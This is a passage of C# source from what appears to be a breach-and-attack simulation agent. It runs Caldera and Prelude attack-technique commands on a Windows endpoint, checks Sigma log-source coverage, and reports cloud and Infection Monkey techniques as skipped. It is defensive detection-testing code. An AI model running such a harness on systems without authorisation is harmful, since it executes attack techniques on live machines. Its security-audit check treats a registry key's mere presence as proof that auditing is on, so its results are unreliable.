                string cleanup  = exec.Cleanup ?? "";

                // Register cleanup as rollback safety net before execution
                if (!string.IsNullOrWhiteSpace(cleanup))
                {
                    string rbExec = executor, rbClean = cleanup, rbTech = techId;
                    SimulationArtifactTracker.RegisterRollback(
                        $"Caldera {techId} – {ability.Name}",
                        () => RunFrameworkCmd(rbExec, rbClean, "bas_caldera_cleanup"));
                }
                SimulationArtifactTracker.LogArtifact(ArtifactType.Process, techId,
                    null, "executing", testName);

                string capTactic = ability.Tactic ?? "";
                string capTechName = ability.Technique?.Name ?? ability.Name ?? "";
                string capDesc = ability.Description ?? "";

                var check = await RunCheck(testName, techId, async () =>
                {
                    var (result, rawOut) = await RunFrameworkCmd(executor, command, "bas_caldera");
                    Console.WriteLine($"[Caldera]   → {(result == CheckResult.Fail ? "✗ FAIL" : "✓ PASS")} {techId}");
                    if (!string.IsNullOrWhiteSpace(cleanup))
                        await RunFrameworkCmd(executor, cleanup, "bas_caldera_cleanup");
                    string detail = FrameworkDetails(result, techId, capTechName, capDesc, capTactic, rawOut);
                    string rem    = FrameworkRemediation(result, capTactic, techId, capTechName);
                    return (result, detail, rem);
                });
                check.Severity     = FrameworkSeverity(capTactic);
                check.ThreatImpact = FrameworkThreatImpact(capTactic, techId, capTechName);
                cat.Checks.Add(check);
                await flush();
                ran++;
            }
        }

        Console.WriteLine($"[Caldera] {ran} abilities executed, {skipped} skipped.");
    }

    // ──────────────────────────────────────────────────────────────
    // 17. PRELUDE TTPs
    // Place community-master/ or prelude-community-master/ next to BASAgent.exe.
    // Scans ttps/ directory for YAML technique files.
    // ──────────────────────────────────────────────────────────────
    static async Task Sim_Prelude(SimulationCategory cat, Func<Task> flush)
    {
        cat.Name  = "17. Prelude Operator TTPs";
        cat.Phase = "MITRE ATT&CK Full Coverage";

        // Auto-discover any *master* folder beside BASAgent.exe containing Prelude TTP YAMLs
        string? preludeRoot = AutoDiscoverFramework("Prelude", new[] { "*.yaml", "*.yml" },
            c => c.Contains("platforms:") && (c.Contains("  psh:") || c.Contains("  cmd:")));

        // Prefer the ttps/ subdirectory if present, otherwise use the root
        string? ttpsPath = null;
        if (preludeRoot != null)
        {
            var sub = Path.Combine(preludeRoot, "ttps");
            ttpsPath = Directory.Exists(sub) ? sub : preludeRoot;
        }

        if (ttpsPath == null)
        {
            cat.Checks.Add(new SimCheck { Name = "Prelude – no TTP YAML files found", Result = CheckResult.Skipped,
                Severity = "Info",
                Details = "No *master* folder containing Prelude TTP YAML ability files found beside BASAgent.exe. " +
                          "Note: prelude-libraries-master is the Prelude SDK/probe library (raindrop.ps1, nocturnal.sh) " +
                          "and does NOT contain ATT&CK technique ability definitions.",
                Remediation = "For Prelude TTP coverage, place a Prelude Operator community abilities repository " +
                              "(with YAML files containing 'platforms:' and 'psh:'/'cmd:' executor sections) " +
                              "in a folder with 'master' in its name beside BASAgent.exe." });
            await flush();
            return;
        }

        Console.WriteLine($"[Prelude] TTPs path: {ttpsPath}");
        var ds = new DeserializerBuilder().WithNamingConvention(CamelCaseNamingConvention.Instance)
                     .IgnoreUnmatchedProperties().Build();

        int ran = 0, skipped = 0;
        foreach (var yml in Directory.GetFiles(ttpsPath, "*.yaml", SearchOption.AllDirectories)
                                     .Concat(Directory.GetFiles(ttpsPath, "*.yml", SearchOption.AllDirectories))
                                     .OrderBy(f => f))
        {
            PreludeTtp? ttp = null;
            try { ttp = ds.Deserialize<PreludeTtp>(await File.ReadAllTextAsync(yml)); }
            catch { skipped++; continue; }

            if (ttp == null) { skipped++; continue; }

            // Extract Windows executors: platforms.windows.psh / platforms.windows.cmd
            if (ttp.Platforms == null ||
                !ttp.Platforms.TryGetValue("windows", out var winExecs) ||
                winExecs == null) { skipped++; continue; }

            // Prefer psh, fall back to cmd
            PreludeExec? exec = null;
            string execName = "psh";
            if (winExecs.TryGetValue("psh", out var pshExec) && !string.IsNullOrWhiteSpace(pshExec?.Command))
            { exec = pshExec; execName = "psh"; }
            else if (winExecs.TryGetValue("cmd", out var cmdExec) && !string.IsNullOrWhiteSpace(cmdExec?.Command))
            { exec = cmdExec; execName = "cmd"; }

            if (exec == null) { skipped++; continue; }

            // Skip tests with unresolved #{variable} placeholders (no default values defined)
            string command = exec.Command!;
            if (command.Contains("#{")) { skipped++; continue; }

            // Try to extract technique ID from metadata ATT&CK
            string techId = "N/A";
            try
            {
                if (ttp.Metadata != null && ttp.Metadata.TryGetValue("ATT&CK", out var attackObj))
                {
                    var attackStr = attackObj?.ToString() ?? "";
                    var match = System.Text.RegularExpressions.Regex.Match(attackStr, @"T\d{4}(?:\.\d{3})?");
                    if (match.Success) techId = match.Value;
                }
            }
            catch { }

            string testName = $"[Prelude] {techId} – {ttp.Name}";
            string cleanup  = exec.Cleanup ?? "";
            string capturedExec  = execName;
            string capturedCmd   = command;
            string capturedClean = cleanup;
            string capturedTech  = techId;
            string capturedName  = ttp.Name ?? techId;
            string capturedTactic = MitreTacticMap.Lookup(techId);
            string capturedDesc  = ttp.Description ?? "";

            // Register cleanup as rollback safety net before execution
            if (!string.IsNullOrWhiteSpace(capturedClean))
            {
                string rbExec = capturedExec, rbClean = capturedClean, rbTech = capturedTech;
                SimulationArtifactTracker.RegisterRollback(
                    $"Prelude {capturedTech} – {capturedName}",
                    () => RunFrameworkCmd(rbExec, rbClean, "bas_prelude_cleanup"));
            }
            SimulationArtifactTracker.LogArtifact(ArtifactType.Process, capturedTech,
                null, "executing", testName);

            var check = await RunCheck(testName, techId, async () =>
            {
                var (result, rawOut) = await RunFrameworkCmd(capturedExec, capturedCmd, "bas_prelude");
                Console.WriteLine($"[Prelude]   → {(result == CheckResult.Fail ? "✗ FAIL" : "✓ PASS")} {capturedTech}");
                if (!string.IsNullOrWhiteSpace(capturedClean))
                    await RunFrameworkCmd(capturedExec, capturedClean, "bas_prelude_cleanup");
                string detail = FrameworkDetails(result, capturedTech, capturedName, capturedDesc, capturedTactic, rawOut);
                string rem    = FrameworkRemediation(result, capturedTactic, capturedTech, capturedName);
                return (result, detail, rem);
            });
            check.Severity     = FrameworkSeverity(capturedTactic);
            check.ThreatImpact = FrameworkThreatImpact(capturedTactic, capturedTech, capturedName);
            cat.Checks.Add(check);
            await flush();
            ran++;
        }

        Console.WriteLine($"[Prelude] {ran} TTPs executed, {skipped} skipped.");
    }

    // ──────────────────────────────────────────────────────────────
    // 18. SIGMA RULE COVERAGE
    // Place sigma-master/ next to BASAgent.exe.
    // Does NOT execute attacks. Instead validates whether the
    // Windows logging infrastructure needed for each Sigma rule
    // log source is active. Pass = log source enabled (can detect).
    // Fail = log source missing (blind spot, rule can never fire).
    // ──────────────────────────────────────────────────────────────
    static async Task Sim_Sigma(SimulationCategory cat, Func<Task> flush)
    {
        cat.Name  = "18. Sigma Rule Coverage";
        cat.Phase = "Detection Coverage";

        // Auto-discover any *master* folder beside BASAgent.exe containing Sigma rule YAMLs
        string? sigmaPath = AutoDiscoverFramework("Sigma", new[] { "*.yml" },
            c => c.Contains("logsource:") && c.Contains("detection:"));

        if (sigmaPath == null)
        {
            cat.Checks.Add(new SimCheck
            {
                Name        = "Sigma – no rule YAML files found",
                Result      = CheckResult.Skipped,
                Severity    = "Info",
                Details     = "No *master* folder containing Sigma rule YAML files found beside BASAgent.exe.",
                Remediation = "Place a folder with 'master' in its name (e.g. sigma-master) beside BASAgent.exe. " +
                              "It must contain .yml files with 'logsource:' and 'detection:' fields."
            });
            await flush();
            return;
        }

        Console.WriteLine($"[Sigma] Rules path: {sigmaPath}");

        // Probe which log sources are active on this endpoint
        bool sysmonRunning       = IsSysmonRunning();
        bool psScriptBlock       = IsPowerShellScriptBlockLoggingEnabled();
        bool psModuleLogging     = IsPowerShellModuleLoggingEnabled();
        bool securityAudit       = IsSecurityAuditEnabled();
        bool defenderRunning     = IsDefenderRealtimeEnabled();
        bool eventLogRunning     = IsEventLogServiceRunning();

        Console.WriteLine($"[Sigma] Sysmon:{sysmonRunning}  PSScriptBlock:{psScriptBlock}  " +
                          $"PSModule:{psModuleLogging}  SecurityAudit:{securityAudit}  " +
                          $"Defender:{defenderRunning}  EventLog:{eventLogRunning}");

        // One check per individual Sigma rule
        var ds = new DeserializerBuilder().WithNamingConvention(CamelCaseNamingConvention.Instance)
                     .IgnoreUnmatchedProperties().Build();

        int parsed = 0, parseErrors = 0, covered = 0, blind = 0, noSource = 0;
        foreach (var yml in Directory.GetFiles(sigmaPath, "*.yml", SearchOption.AllDirectories).OrderBy(f => f))
        {
            SigmaRule? rule = null;
            try { rule = ds.Deserialize<SigmaRule>(await File.ReadAllTextAsync(yml)); parsed++; }
            catch { parseErrors++; continue; }

            if (rule?.Logsource == null) { noSource++; continue; }

            bool isCovered = IsSigmaSourceCovered(rule.Logsource,
                                 sysmonRunning, psScriptBlock, psModuleLogging,
                                 securityAudit, defenderRunning, eventLogRunning);

            string sourceKey = DerivedSigmaSourceKey(rule.Logsource);
            string title     = rule.Title ?? Path.GetFileNameWithoutExtension(yml);

            // Extract ATT&CK technique from tags (e.g. "attack.t1059.001" → "T1059.001")
            string techId = rule.Tags?
                .FirstOrDefault(t => t.StartsWith("attack.t", StringComparison.OrdinalIgnoreCase))
                ?.Substring(7).ToUpper() ?? "N/A";

            string severity = (rule.Level ?? "medium").ToLowerInvariant() switch
            {
                "critical" => "Critical",
                "high"     => "High",
                "low"      => "Low",
                "informational" => "Info",
                _ => "Medium"
            };

            if (isCovered) covered++; else blind++;

            cat.Checks.Add(new SimCheck
            {
                Name        = $"[Sigma] {title}",
                TechniqueId = techId,
                Result      = isCovered ? CheckResult.Pass : CheckResult.Fail,
                Severity    = severity,
                Details     = $"Log source: {sourceKey}" +
                              (string.IsNullOrWhiteSpace(rule.Description) ? "" : $" | {rule.Description.Trim()}"),
                Remediation = isCovered
                    ? "Log source is active — this Sigma rule can fire on this endpoint."
                    : SigmaRemediation(sourceKey),
                ThreatImpact = isCovered
                    ? $"{techId}: Detection log source is active. This Sigma rule will alert on attacker activity."
                    : FrameworkThreatImpact(MitreTacticMap.Lookup(techId), techId, title)
            });
            await flush();
        }

        Console.WriteLine($"[Sigma] {parsed} rules parsed, {parseErrors} errors, {noSource} without logsource. " +
                          $"{covered} rules can fire, {blind} are blind (log source missing).");
    }

    static string DerivedSigmaSourceKey(SigmaLogSource ls)
    {
        if (!string.IsNullOrWhiteSpace(ls.Category)) return ls.Category.ToLowerInvariant();
        if (!string.IsNullOrWhiteSpace(ls.Service))  return $"service:{ls.Service.ToLowerInvariant()}";
        return "unknown";
    }

    static bool IsSigmaSourceCovered(SigmaLogSource ls,
        bool sysmon, bool psScriptBlock, bool psModule, bool secAudit, bool defender, bool eventLog)
    {
        string cat = ls.Category?.ToLowerInvariant() ?? "";
        string svc = ls.Service?.ToLowerInvariant() ?? "";
        return cat switch
        {
            "process_creation"  => sysmon || secAudit,
            "network_connection"=> sysmon,
            "file_creation"     => sysmon,
            "registry_event"    => sysmon,
            "registry_set"      => sysmon,
            "image_load"        => sysmon,
            "pipe_creation"     => sysmon,
            "ps_script"         => psScriptBlock,
            "ps_module"         => psModule,
            "ps_classic_start"  => eventLog,
            _ => svc switch
            {
                "security"  => secAudit,
                "windefend" => defender,
                "sysmon"    => sysmon,
                "system"    => eventLog,
                "application" => eventLog,
                _ => eventLog
            }
        };
    }

    static string SigmaRemediation(string src) =>
        src.Contains("process_creation") ? "Enable Sysmon or Windows process creation auditing (Event ID 4688 via secpol.msc)." :
        src.Contains("ps_script")        ? "Enable PowerShell ScriptBlock logging: GPO → Computer Configuration → Windows Settings → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging." :
        src.Contains("ps_module")        ? "Enable PowerShell Module logging via GPO (same path as ScriptBlock logging)." :
        src.Contains("network")          ? "Install Sysmon with network connection logging (EventID 3). Configure Sysmon with a rule that captures NetworkConnect events." :
        src.Contains("registry")         ? "Install Sysmon and configure registry monitoring (EventIDs 12/13/14)." :
        src.Contains("file")             ? "Install Sysmon and configure file creation logging (EventID 11)." :
        src.Contains("sysmon")           ? "Install and configure Sysmon (https://docs.microsoft.com/sysinternals/downloads/sysmon)." :
        src.Contains("security")         ? "Enable Windows Security Audit policy via secpol.msc → Local Policies → Audit Policy." :
        "Enable the relevant Windows Event Log channel for this log source.";

    static bool IsEventLogServiceRunning()
    {
        try
        {
            using var sc = new ServiceController("EventLog");
            return sc.Status == ServiceControllerStatus.Running;
        }
        catch { return false; }
    }

    static bool IsPowerShellModuleLoggingEnabled()
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging");
            return key != null && (key.GetValue("EnableModuleLogging") as int?) == 1;
        }
        catch { return false; }
    }

    static bool IsSecurityAuditEnabled()
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Lsa");
            // Presence of audit policy configuration implies security auditing is active
            return key != null;
        }
        catch { return false; }
    }

    // ──────────────────────────────────────────────────────────────
    // 19. STRATUS RED TEAM
    // Place stratus-red-team-main/ next to BASAgent.exe.
    // Stratus techniques are cloud-only (AWS/Azure/GCP/k8s).
    // The agent detects the folder and reports all techniques
    // as Skipped with context — no Windows execution is possible.
    // ──────────────────────────────────────────────────────────────
    static async Task Sim_StratusRedTeam(SimulationCategory cat, Func<Task> flush)
    {
        cat.Name  = "19. Stratus Red Team";
        cat.Phase = "Cloud Attack Coverage";

        // Auto-discover any *master* folder beside BASAgent.exe containing Stratus technique docs
        string? stratusRoot = AutoDiscoverFramework("Stratus", new[] { "*.md" },
            c => c.Contains("## ATT&CK") || c.Contains("attack-technique") || c.Contains("MITRE ATT&CK"));

        // Prefer docs/attack-techniques subfolder for cleaner enumeration, otherwise use root
        string? stratusPath = null;
        if (stratusRoot != null)
        {
            var sub = Path.Combine(stratusRoot, "docs", "attack-techniques");
            stratusPath = (Directory.Exists(sub) && Directory.GetFiles(sub, "*.md", SearchOption.AllDirectories).Length > 0)
                          ? sub : stratusRoot;
        }

        if (stratusPath == null)
        {
            cat.Checks.Add(new SimCheck { Name = "Stratus Red Team – folder not found", Result = CheckResult.Skipped,
                Severity = "Info",
                Details = "No *master* folder containing Stratus technique markdown files found beside BASAgent.exe.",
                Remediation = "Place a folder with 'master' in its name (e.g. stratus-red-team-master) beside BASAgent.exe. " +
                              "It must contain .md files with ATT&CK technique content." });
            await flush();
            return;
        }

        // Enumerate technique markdown files and report each as Skipped (cloud-only)
        var mdFiles = Directory.GetFiles(stratusPath, "*.md", SearchOption.AllDirectories);
        Console.WriteLine($"[Stratus] Found {mdFiles.Length} technique docs. Reporting as cloud-only.");

        foreach (var md in mdFiles.OrderBy(f => f))
        {
            string techName = Path.GetFileNameWithoutExtension(md);
            string provider = Path.GetFileName(Path.GetDirectoryName(md)) ?? "unknown";
            string techId   = System.Text.RegularExpressions.Regex.Match(techName, @"T\d{4}(?:\.\d{3})?").Value;

            string stratusTactic = MitreTacticMap.Lookup(techId);
            cat.Checks.Add(new SimCheck
            {
                Name        = $"[Stratus] {provider}/{techName}",
                TechniqueId = string.IsNullOrEmpty(techId) ? "N/A" : techId,
                Result      = CheckResult.Skipped,
                Severity    = string.IsNullOrEmpty(techId) ? "Info" : FrameworkSeverity(stratusTactic),
                Details     = $"Cloud-only technique ({provider}). Stratus Red Team targets AWS/Azure/GCP/Kubernetes infrastructure " +
                              "and cannot be executed by an on-premises Windows agent.",
                Remediation = "Deploy Stratus Red Team from a cloud workstation: `stratus detonate " + techName + "`. " +
                              "Ensure CloudTrail/Azure Monitor/GCP Audit Logs are enabled to validate detection.",
                ThreatImpact = FrameworkThreatImpact(stratusTactic, string.IsNullOrEmpty(techId) ? "N/A" : techId, techName)
            });
            await flush();
        }

    }

    // ──────────────────────────────────────────────────────────────
    // 20. INFECTION MONKEY
    // Place infection-monkey-master/ next to BASAgent.exe.
    // Infection Monkey is a Python-based C2 breach simulation.
    // Techniques are Python classes — not executable as static YAML.
    // The agent detects the folder and reports post-breach action
    // names as Skipped with guidance to run the Monkey Island server.
    // ──────────────────────────────────────────────────────────────
    static async Task<SimulationCategory> Sim_InfectionMonkey()
    {
        var cat = new SimulationCategory { Name = "20. Infection Monkey", Phase = "Breach Simulation Coverage" };

        // Auto-discover any *master* folder beside BASAgent.exe containing Infection Monkey files.
        // README.md and build scripts use "Infection Monkey" / "infection_monkey"; vulture_allowlist.py
        // lists package symbols. Either is enough to confirm the folder identity.
        string? monkeyPath = AutoDiscoverFramework("InfectionMonkey", new[] { "*.py", "*.md" },
            c => c.Contains("post_breach") || c.Contains("PostBreachAction") ||
                 c.Contains("infection_monkey") || c.Contains("Infection Monkey"));

        if (monkeyPath == null)
        {
            cat.Checks.Add(new SimCheck { Name = "Infection Monkey – folder not found", Result = CheckResult.Skipped,
                Severity = "Info",
                Details = "No *master* folder containing Infection Monkey Python files found beside BASAgent.exe.",
                Remediation = "Place a folder with 'master' in its name (e.g. infection-monkey-master) beside BASAgent.exe. " +
                              "It must contain .py files with post-breach action classes." });
            return cat;
        }

        // Enumerate Python action files (they define the technique names)
        var pyFiles = Directory.GetFiles(monkeyPath, "*.py", SearchOption.AllDirectories)
                               .Where(f => !Path.GetFileName(f).StartsWith("__"))
                               .ToArray();
        Console.WriteLine($"[InfectionMonkey] Found {pyFiles.Length} Python action files.");

        if (pyFiles.Length == 0)
        {
            cat.Checks.Add(new SimCheck { Name = "Infection Monkey – no action files found", Result = CheckResult.Skipped,
                Severity = "Info", Details = $"Searched in: {monkeyPath}",
                Remediation = "Ensure the full Infection Monkey source archive is extracted." });
            return cat;
        }

        foreach (var py in pyFiles.OrderBy(f => f))
        {
            string actionName = Path.GetFileNameWithoutExtension(py)
                                    .Replace("_", " ")
                                    .Replace("-", " ");

            // Try to extract a T-ID from the file content or path
            string monkeyTechId  = "N/A";
            string monkeyTactic  = "";
            try
            {
                string content = await File.ReadAllTextAsync(py);
                var m = System.Text.RegularExpressions.Regex.Match(content, @"T\d{4}(?:\.\d{3})?");
                if (m.Success) { monkeyTechId = m.Value; monkeyTactic = MitreTacticMap.Lookup(monkeyTechId); }
            }
            catch { }

            cat.Checks.Add(new SimCheck
            {
                Name        = $"[Monkey] {actionName}",
                TechniqueId = monkeyTechId,
                Result      = CheckResult.Skipped,
                Severity    = string.IsNullOrEmpty(monkeyTactic) ? "Medium" : FrameworkSeverity(monkeyTactic),
                Details     = $"Infection Monkey post-breach action '{actionName}' requires the Monkey Island C2 server. " +
                              "Cannot be executed by a standalone Windows agent.",
                Remediation = "Run Monkey Island server (Docker or Linux), deploy the Monkey agent from it, " +
                              "then enable this post-breach action in the Island configuration.",
                ThreatImpact = FrameworkThreatImpact(monkeyTactic, monkeyTechId, actionName)
            });
        }

        return cat;
    }

    // ──────────────────────────────────────────────────────────────
    // 21. INVOKE-ATOMICREDTEAM
    // Place invoke-atomicredteam-master/ next to BASAgent.exe.
    // This framework is a PowerShell harness around the same ART
    // atomics/ folder — no separate technique library exists.
    // The agent already processes atomics/ directly (Sim_15_AtomicRedTeam).
    // ──────────────────────────────────────────────────────────────
    static async Task<SimulationCategory> Sim_InvokeART()
    {
        var cat = new SimulationCategory { Name = "21. Invoke-AtomicRedTeam", Phase = "MITRE ATT&CK Full Coverage" };

        // Auto-discover any *master* folder beside BASAgent.exe containing the Invoke-AtomicRedTeam PS module
        string? iartPath = AutoDiscoverFramework("Invoke-ART", new[] { "*.ps1", "*.psd1" },
            c => c.Contains("Invoke-AtomicTest") || c.Contains("AtomicRedTeam") || c.Contains("ModuleVersion"));

        if (iartPath == null)
        {
            cat.Checks.Add(new SimCheck { Name = "Invoke-AtomicRedTeam – folder not found", Result = CheckResult.Skipped,
                Severity = "Info",
                Details = "No *master* folder containing the Invoke-AtomicRedTeam PowerShell module found beside BASAgent.exe.",
                Remediation = "Place a folder with 'master' in its name (e.g. invoke-atomicredteam-master) beside BASAgent.exe. " +
                              "It must contain .ps1/.psd1 files with 'Invoke-AtomicTest' or 'AtomicRedTeam' content." });
            return cat;
        }

        // Count PS1 files in the module for informational purposes
        int ps1Count = Directory.GetFiles(iartPath, "*.ps1", SearchOption.AllDirectories).Length;

        cat.Checks.Add(new SimCheck
        {
            Name        = "Invoke-AtomicRedTeam – module detected",
            TechniqueId = "N/A",
            Result      = CheckResult.Pass,
            Severity    = "Info",
            Details     = $"Invoke-AtomicRedTeam PowerShell module found ({ps1Count} PS1 files). " +
                          "This is a PowerShell harness for the same ART atomics/ library. " +
                          "All Windows ART techniques are already executed directly in category 15 — no duplicate execution needed.",
            ThreatImpact = "Invoke-AtomicRedTeam is a force-multiplier for red teams: it enables automated, " +
                           "scheduled execution of every ART technique via PowerShell remoting. " +
                           "Its presence confirms the atomics library is operational on this endpoint.",
            Remediation  = "Module is present and operational. Use 'Invoke-AtomicTest T<id> -ShowDetails' " +
                           "to inspect individual technique coverage."
        });

        // Verify the harness can be loaded by PowerShell
        cat.Checks.Add(await RunCheck("Invoke-AtomicRedTeam – PS module importable", "T1059.001", async () =>
        {
            string psdFile = Directory.GetFiles(iartPath, "*.psd1", SearchOption.AllDirectories).FirstOrDefault() ?? "";
            if (string.IsNullOrEmpty(psdFile))
                return (CheckResult.Skipped, "No .psd1 module manifest found.", "Ensure a full Invoke-AtomicRedTeam archive is extracted.");

            var (result, detail) = await RunFrameworkCmd("psh",
                $"Import-Module \"{psdFile}\" -Force; if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) {{ exit 0 }} else {{ exit 1 }}",
                "iart");
            string rem = result == CheckResult.Fail
                ? "Invoke-AtomicRedTeam module loaded successfully (PowerShell can import it)."
                : "Invoke-AtomicRedTeam module failed to import — PowerShell policy or dependency issue.";
            return (result == CheckResult.Fail ? CheckResult.Pass : CheckResult.Fail, detail, rem);
        }));

        return cat;
    }
}
